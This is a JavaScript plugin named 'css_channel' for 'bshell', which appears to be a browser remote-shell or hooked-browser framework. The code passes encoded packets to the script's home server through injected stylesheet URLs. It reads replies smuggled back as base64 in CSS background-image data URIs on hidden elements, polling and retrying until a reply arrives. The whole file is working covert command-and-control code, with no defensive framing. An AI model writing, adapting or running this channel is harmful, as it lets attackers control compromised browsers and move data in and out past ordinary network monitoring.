css_channel = function(bshell) {
    if(!bshell.require_plugin('base64'))
	return false;

    bshell.register_plugin('css_channel', function(bshell) {
	var self = this;
	self.bshell = bshell;

	self.init = function() {
	};

	self.get_style_data = function(elm) {
	    var bg = false;
	    if (!window.getComputedStyle) { // IE
		bg = elm.currentStyle['background-image'];
	    }
	    else {
		bg = window.getComputedStyle(elm, null).backgroundImage;
	    }

	    if(/data\:image\/png;base64,/.test(bg)) {
//		self.bshell.log("css_channel: style has arrived");
		return bg.match(/data:image\/png;base64,([^\)]*)/)[1];
	    }
	    return false;
	}

	self.make_request = function(url, packet, callback) {
	    var id = parseInt(Math.random()*0x0badc0de);
	    packet.css_id = id;

	    var css = document.createElement("link");
	    css.setAttribute("id", "x"+id+"x");
	    css.setAttribute("rel", "stylesheet");
	    css.setAttribute("href", bshell.script_location.substr(0, bshell.script_location.lastIndexOf("/")+1) + "?req=" + self.bshell.encode_packet(packet) + "&r=" + Math.random());
	    document.body.appendChild(css);
//	    self.bshell.log("css_channel: request initiated");

	    var elm = document.createElement("a");
	    elm.setAttribute("id", "y"+id+"y");
	    elm.setAttribute("style", "display: none");
	    document.body.appendChild(elm);

	    var req = {id: id, url: url, packet: packet, css: css, elm: elm, callback: callback};
	    setTimeout(function() { self.check_response(req, 0);}, 100);
	};

	self.check_response = function(req, cnt) {
	    var data = self.get_style_data(req.elm);
	    if(data) {
		var packet = self.bshell.plugins.base64.decode(data);

		try {
		    document.body.removeChild(req.elm);
		    document.body.removeChild(req.css);
		} catch(e) {}
		
		req.callback(packet);
		
		return;
	    }

	    if(cnt++ < 200) {
		setTimeout(function() { self.check_response(req, cnt); }, 100+cnt*2);
	    } else {
		document.body.removeChild(req.elm);
		document.body.removeChild(req.css);
		setTimeout(function() {self.make_request(req.url, req.packet, req.callback);}, 100);
	    }
	};

	return self.init();
    });

}(bshell);